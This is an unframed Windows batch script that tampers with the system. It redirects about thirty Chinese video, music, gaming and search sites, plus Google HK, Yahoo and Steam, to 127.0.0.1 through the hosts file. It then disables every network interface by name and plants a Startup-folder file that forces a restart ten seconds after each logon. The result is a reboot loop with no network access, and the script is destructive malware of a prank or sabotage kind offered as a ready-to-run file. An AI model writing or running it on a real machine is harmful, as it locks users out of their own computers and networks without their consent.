attrib -R C:\WINDOWS\system32\drivers\etc\hosts 
@echo\  
@echo 127.0.0.1 www.bilibili.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 music.163.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 y.qq.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.iqiyi.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 vip.iqiyi.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.youku.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.kuwo.cn >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.kugou.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 v.qq.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.huya.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.douyu.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.ximalaya.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.acfun.cn >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 m.xiami.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.weibo.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.guabi.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 kg.qq.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.steampowered.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.4399.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.imomoe.jp >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 im.qq.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 qqgame.qq.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.baidu.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.sogou.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 cn.bing.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 cn.bing.com/?ensearch=1&FORM=BEHPTB >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.so.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.2345.com/so.htm >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.yahoo.com >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 www.google.com.hk >>C:\WINDOWS\system32\drivers\etc\hosts
@echo 127.0.0.1 start.firefoxchina.cn >>C:\WINDOWS\system32\drivers\etc\hosts
@echo\
ipconfig /flushdns

netsh interface set interface "以太网 2" disabled
netsh interface set interface "WLAN 2" disabled
netsh interface set interface "本地连接" disabled
netsh interface set interface "本地连接 2" disabled
netsh interface set interface "WLAN" disabled
netsh interface set interface "以太网" disabled
netsh interface set interface "无线网络连接" disabled
netsh interface set interface "Bluetooth 网络连接" disabled
netsh interface set interface "无线网络连接 2" disabled

echo shutdown -r -t 10 >>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Rebooting.bat